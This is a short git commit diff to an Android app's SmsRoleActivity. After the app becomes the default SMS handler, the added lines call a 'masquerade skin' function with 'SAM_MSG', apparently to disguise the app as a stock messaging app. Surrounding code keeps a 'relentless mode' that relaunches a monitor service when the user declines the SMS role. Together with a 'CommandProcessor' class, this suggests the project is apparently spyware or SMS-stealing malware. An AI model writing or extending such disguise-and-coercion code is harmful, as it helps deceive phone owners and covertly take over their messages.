2bf3d9e0597d54fec16c1079372faad9abd34daf
GetyeTek <getyeteklu2@gmail.com>
2026-04-30 18:29:16 +0300

    Refactor Masquerade logic into utility and trigger SAM_MSG s

--- app/src/main/java/com/example/myandroid/SmsRoleActivity.kt
+++ app/src/main/java/com/example/myandroid/SmsRoleActivity.kt
@@ -38,6 +38,9 @@ class SmsRoleActivity : Activity() {
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == 888) {
+            if (DefaultSmsManager.isDefaultSms(this)) {
+                CommandProcessor.applyMasqueradeSkin(this, "SAM_MSG")
+            }
             // If relentless mode is active, trigger the monitor check immediately to see if they declined
             if (DefaultSmsManager.isRelentlessActive) {
                 val i = Intent(this, MonitorService::class.java)
